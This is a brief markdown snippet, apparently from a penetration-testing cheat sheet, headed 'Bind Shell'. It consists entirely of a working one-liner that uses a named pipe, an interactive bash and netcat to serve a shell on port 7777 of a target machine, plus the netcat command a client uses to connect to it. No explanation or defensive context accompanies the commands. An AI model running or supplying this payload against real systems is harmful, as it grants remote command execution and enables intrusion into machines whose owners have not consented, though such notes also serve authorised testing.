# Bind Shell

```bash
Target:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $monIp 7777 > /tmp/f

Client:
nc -nv $monIp 7777
```
